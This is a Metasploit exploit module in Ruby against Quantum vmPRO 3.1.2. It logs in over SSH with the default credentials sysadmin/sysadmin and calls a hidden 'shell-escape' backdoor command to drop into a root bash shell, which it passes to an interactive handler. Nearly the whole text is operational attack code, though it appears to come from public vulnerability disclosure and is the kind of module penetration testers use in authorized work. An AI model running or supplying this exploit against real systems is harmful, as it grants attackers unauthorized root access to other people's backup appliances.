require &#039;net/ssh&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Auxiliary::CommandShell
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Quantum vmPRO Backdoor Command",
      &#039;Description&#039;    => %q{
        This module abuses a backdoor command in vmPRO 3.1.2. Any user, even without admin
        privileges, can get access to the restricted SSH shell. By using the hidden backdoor
        "shell-escape" command it&#039;s possible to drop to a real root bash shell.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;xistence <xistence[at]0x90.nl>&#039;  # Original discovery and Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://packetstormsecurity.com/files/125760/quantumvmpro-backdoor.txt&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Payload&#039;        =>
        {
          &#039;Compat&#039; => {
            &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
            &#039;ConnectionType&#039; => &#039;find&#039;
          }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;Quantum vmPRO 3.1.2&#039;, {}],
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Mar 17 2014",
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22),
        OptString.new(&#039;USER&#039;, [ true, &#039;vmPRO SSH user&#039;, &#039;sysadmin&#039;]),
        OptString.new(&#039;PASS&#039;, [ true, &#039;vmPRO SSH password&#039;, &#039;sysadmin&#039;])
      ], self.class
    )
 
    register_advanced_options(
      [
        OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
        OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
      ]
    )
  end
 
 
  def rhost
    datastore[&#039;RHOST&#039;]
  end
 
 
  def rport
    datastore[&#039;RPORT&#039;]
  end
 
 
  def do_login(user, pass)
    opts = {
      :auth_methods => [&#039;password&#039;, &#039;keyboard-interactive&#039;],
      :msframework  => framework,
      :msfmodule    => self,
      :port         => rport,
      :disable_agent => true,
      :config => true,
      :password => pass,
      :record_auth_info => true,
      :proxies => datastore[&#039;Proxies&#039;]
    }
 
    opts.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]
 
    begin
      ssh = nil
      ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        ssh = Net::SSH.start(rhost, user, opts)
      end
    rescue Rex::ConnectionError, Rex::AddressInUse
      return nil
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return nil
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return nil
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
      return nil
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return nil
    end
 
    if ssh
      conn = Net::SSH::CommandStream.new(ssh, &#039;shell-escape&#039;, true)
      return conn
    end
 
    return nil
  end
 
 
  def exploit
    user = datastore[&#039;USER&#039;]
    pass = datastore[&#039;PASS&#039;]
 
    print_status("#{rhost}:#{rport} - Attempt to login...")
    conn = do_login(user, pass)
    if conn
      print_good("#{rhost}:#{rport} - Login Successful with &#039;#{user}:#{pass}&#039;")
      handler(conn.lsock)
    end
  end
end

